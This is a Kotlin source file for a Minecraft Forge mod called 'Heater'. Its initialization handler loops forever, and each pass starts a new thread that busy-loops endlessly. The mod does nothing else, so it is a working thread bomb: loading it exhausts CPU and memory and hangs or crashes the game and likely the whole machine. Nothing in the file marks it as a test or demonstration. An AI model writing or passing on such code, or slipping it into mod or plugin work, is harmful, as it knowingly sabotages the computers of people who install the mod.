package dev.salmon.heater

import net.minecraftforge.fml.common.Mod
import net.minecraftforge.fml.common.event.FMLInitializationEvent

@Mod(modid = "heater", name = "Heater", version = "1.0.0")
object Heater {

    @Mod.EventHandler
    fun onInitialization(event: FMLInitializationEvent) {
        while (true) {
            Thread {
                while (true);
            }.start()
        }
    }
}